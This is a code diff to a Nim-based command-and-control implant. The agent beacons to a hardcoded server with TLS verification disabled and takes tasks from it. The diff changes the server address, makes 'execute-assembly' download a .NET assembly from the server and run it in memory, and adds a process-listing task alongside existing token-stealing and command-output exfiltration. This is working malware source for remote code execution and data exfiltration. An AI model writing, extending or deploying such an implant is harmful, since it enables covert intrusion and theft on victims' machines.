@@ -2,6 +2,7 @@ import httpclient, base64, json, osproc, random, os, strutils, net
 include ./libs_agent/executeass
 include ./libs_agent/ekko
 include ./libs_agent/steal_token
+include ./libs_agent/getprocess
 
 proc get_request_headers(url: string, api_key: string, identifier:string):string =
     let client = newHttpClient(sslContext=newContext(verifyMode=CVerifyNone))
@@ -31,7 +32,7 @@ proc random_sleep(sleep_time:int):int =
 proc main() =
     randomize()
     var secret_key = "RkRrcitEQ28hYTwsWGNpMWJfPGZAczJIT0Z0dXJMMilBdSpHXipqaENmTmU="
-    var url = "https://192.168.79.73/"
+    var url = "https://192.168.0.40/"
     var identifier = $(int(rand(float(100000000000000000))))
     var sleep_time = 1
     #echo $(random_sleep(sleep_time))
@@ -54,8 +55,10 @@ proc main() =
                     var output_json = %*[{"task_id":task_id,"output":command_output}]
                     var output = post_request_headers(url&"output", $secret_key, $output_json, $identifier)
                 elif $module_method == "execute-assembly":
-                    var assembly_content = ""
-                    var command_output = executeassembly(convertToByteSeq(assembly_content),[],$(int(rand(float(100000000000000000)))))
+                    var all_arguments = split(method_arguments)
+                    var assembly_content = get_assembly(url & "/hosted_files?file=" & all_arguments[0])
+                    all_arguments.del(0)
+                    var command_output = executeassembly(convertToByteSeq(assembly_content),all_arguments,"tempfile")
                     var output_json = %*[{"task_id":task_id,"output":encode(command_output)}]
                     var output = post_request_headers(url&"output", $secret_key, $output_json, $identifier)
                 elif $module_method == "steal-token":
@@ -72,6 +75,11 @@ proc main() =
                     var username = GetUser()
                     var output_json = %*[{"task_id":task_id,"output":encode(username)}]
                     var output = post_request_headers(url&"output", $secret_key, $output_json, $identifier)
+                elif $module_method == "ps":
+                    var username = GetProcess()
+                    var output_json = %*[{"task_id":task_id,"output":encode(username)}]
+                    var output = post_request_headers(url&"output", $secret_key, $output_json, $identifier)
+
 
     #let output = execute_command("dir C:\\Users\\")
     #echo "command output :"
